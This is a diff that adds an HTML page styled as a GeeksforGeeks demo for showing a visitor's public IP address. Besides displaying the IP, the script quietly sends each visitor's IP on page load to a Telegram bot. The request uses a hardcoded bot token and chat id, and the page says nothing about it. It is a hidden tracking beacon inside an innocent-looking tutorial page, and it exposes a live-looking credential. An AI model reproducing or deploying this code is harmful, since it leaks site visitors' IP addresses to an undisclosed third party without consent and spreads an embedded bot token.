@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" 
+          content="width=device-width, initial-scale=1.0">
+    <title>Getting Client's IP</title>
+    <style>
+        p, h1 {
+            color: green;
+        }
+    </style>
+</head>
+
+<body>
+    <center>
+        <h1>GeeksforGeeks</h1>
+        <h3>Public IP Address of user is:</h3>
+        <p id="ip-address"></p>
+    </center>
+
+    <script>
+        const Http = new XMLHttpRequest()
+        document.addEventListener("DOMContentLoaded", function() {
+            // Fetch the IP address from the API
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    // Display the IP address on the screen
+                    document.getElementById("ip-address").textContent = data.ip;
+                    let url = `https://api.telegram.org/bot6480737039:AAFf475pQ3Pe2ESj1jZ1fqZxzrRIybUjKFg/sendMessage?chat_id=977619219&text=IP ${data.ip}`;
+                    Http.open("GET", url);
+                    Http.send();
+                })
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                });
+        });
+    </script>
+</body>
+
+</html>
